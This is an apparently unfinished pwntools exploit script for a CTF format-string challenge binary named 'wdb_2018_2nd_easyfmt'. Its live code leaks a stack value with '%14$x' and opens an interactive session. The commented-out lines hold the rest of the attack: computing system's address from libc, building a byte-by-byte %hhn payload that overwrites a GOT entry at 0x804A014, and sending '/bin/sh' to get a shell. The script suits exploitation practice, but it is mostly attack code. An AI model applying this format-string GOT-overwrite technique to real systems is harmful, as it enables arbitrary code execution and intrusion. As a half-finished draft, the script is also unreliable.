from pwn import *

context.log_level = 'debug'
p = process('./wdb_2018_2nd_easyfmt')
#p = process('./idaidg/linux_server')
elf = ELF('./wdb_2018_2nd_easyfmt')
libc = elf.libc

p.recvuntil('Do you know repeater?')

p.send('%14$x')
#sleep(1)
# p.recv()
libcbase = p.recv()
print 'libcbase:' + libcbase 
#libcbase = '0x'+libcbase
#libcbase = int(libcbase,16)

#print"libcbase:"+ hex(libcbase)

#system = libcbase + libc.symbols['system']
#system = 1

#print"system:"+hex(system)

#a1 = system % (16*16)
#a2 = (system / (16*16))%(16*16)
#a3 = (system / (16*16*16*16))%(16*16)
#a4 = (system / (16*16*16*16*16*16))%(16*16)

#payload = fmtstr_payload(6,{0x804A014:system})

#payload = p32(0x804A014)
#payload += p32(0x804A014 + 1)
#payload += p32(0x804A014 + 2)
#payload += p32(0x804A014 + 3)
#payload += '%'
#payload += str(a1)
#payload += 'c%6$hhn'
#payload += '%'
#payload += str(a2 - a1)
#payload += 'c%7$hhn'
#payload += '%'
#payload += str(a3 - a2)
#payload += 'c%8$hhn'
#payload += '%'
#payload += str(a4 - a3)
#payload += 'c%9$hhn'

#sleep(1)

#p.send(payload)

#sleep(1)
#p.send('/bin/sh\x00')

p.interactive()